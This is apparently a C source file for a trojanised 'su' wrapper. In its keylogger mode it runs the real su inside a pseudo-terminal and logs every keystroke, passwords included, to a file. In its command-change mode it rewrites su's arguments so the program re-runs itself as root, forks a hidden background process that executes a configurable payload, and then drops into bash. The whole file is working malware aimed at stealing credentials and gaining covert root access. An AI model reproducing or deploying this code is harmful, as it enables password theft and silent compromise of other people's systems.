#include "tas/tas.h"
#include "tas/constructor.c"

#include <stdio.h>
#include <string.h>

#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>

#include "config.h"

// if you enable command change
#ifdef CMDCHANGE

// verify command line
// only proceeds if the command is equal to
// "su" or "su -"
int check_args(int argc, char **argv)
{
	int ret = 1;

	if (argc == 0) {
		goto end;
	}

	argv[0] = "su";

	if (argc > 2 || (argc == 2 && strcmp(argv[1], "-"))) {
		goto end;
	}

	ret = 0;

end:
	return ret;
}

// edit this function to run
// what you want as root
void super(void)
{
	// defined in config.h
	PWNFUNCTION
}

// hide output
void prepare(void)
{
	int fd;
	pid_t pid = fork();
	if (pid == 0) {
		setsid();

		fd = open("/dev/null", O_RDWR);
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);

		if (fd > 2)
			close(fd);

		super();
		_exit(0);
	}
}

void runme(int argc, char **argv)
{
	if (getuid() == 0) {
		prepare();

		execvp("bash", (char *[]){ "bash", "-i", NULL });
		_exit(1);
	}

	if (check_args(argc, argv)) {
		tas_execv("su", argv);
		_exit(0);
	}

	// change the command
	argv[argc]     = "-c";
	argv[argc + 1] = current_exe;
	argv[argc + 2] = NULL;

	tas_execv("su", argv);
	_exit(0);
}

#endif /* CMDCHANGE */

// if you enable keylogger
#ifdef KEYLOGGER

int enable_keylogger(int argc, char **argv)
{
	(void)argc;
	struct termios tios;
	int status;

	tas_tty tty = TAS_TTY_INIT;
	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);

	if (tty.output_fd == -1) {
		#ifdef CMDCHANGE
			runme(argc, argv);
		#else
			tas_execv("su", argv);
		#endif

		_exit(1);
	}

	pid_t pid = tas_forkpty(&tty);
	if (pid <= 0) {
		if (pid == -1)
			close(tty.master);

		#ifdef CMDCHANGE
			runme(argc, argv);
		#else
			tas_execv("su", argv);
		#endif

		_exit(1);
	}

	tty.input_hook = (void *) keylogger;
	tty.stdin_fd = STDIN_FILENO;

	// set to raw mode
	tas_raw_mode(&tios, STDIN_FILENO);

	// rw loop
	tas_tty_loop(&tty);

	// restore
	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);

	waitpid(pid, &status, 0);
	return status;
}

#endif /* KEYLOGGER */

int main(int argc, char **argv)
{
	(void)argc;
	(void)argv;
#ifdef KEYLOGGER
	return enable_keylogger(argc, argv);
#endif

#ifdef CMDCHANGE
	runme(argc, argv);
#endif
}
